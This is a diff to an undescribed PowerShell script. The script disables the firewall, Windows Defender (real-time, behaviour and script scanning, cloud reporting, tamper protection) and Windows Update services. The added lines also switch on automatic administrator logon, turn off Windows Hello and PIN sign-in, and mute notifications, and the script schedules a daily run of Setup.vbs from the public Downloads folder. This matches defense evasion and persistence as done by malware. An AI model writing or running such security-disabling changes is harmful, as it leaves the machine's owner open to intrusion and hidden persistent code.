@@ -18,6 +18,8 @@ Stop-Service -Name "WSearch" -Force
 Set-Service -Name "WSearch" -StartupType Disabled
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -SubmitSamplesConsent NeverSend
+Set-MpPreference -MAPSReporting Disabled
 Set-MpPreference -SubmitSamplesConsent 2
 Set-MpPreference -MAPSReporting 0
 Set-MpPreference -DisableBehaviorMonitoring $true
@@ -27,14 +29,17 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true
 Set-MpPreference -DisableScriptScanning $true
 Set-MpPreference -DisableArchiveScanning $true
 Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
-Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
-Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' /v 'DisableRealtimeMonitoring' /t REG_DWORD /d '1' /f
+reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
+reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications' /v 'ToastEnabled' /t REG_DWORD /d '0' /f
+
 
 $services = @("wuauserv","UsoSvc","BITS","DoSvc","WaaSMedicSvc","SIHClient")
 foreach ($svc in $services) {
@@ -113,6 +118,11 @@ Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -V
 Get-Process -Name "msedge" -ErrorAction SilentlyContinue | Stop-Process -Force
 Get-Process -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue | Stop-Process -Force
 Get-Process | Where-Object { $_.ProcessName -like "msedgewebview2*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "Enabled" -Type DWord -Value 0
+set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "AllowDomainPINLogon" -Type DWord -Value 0
 
 $taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
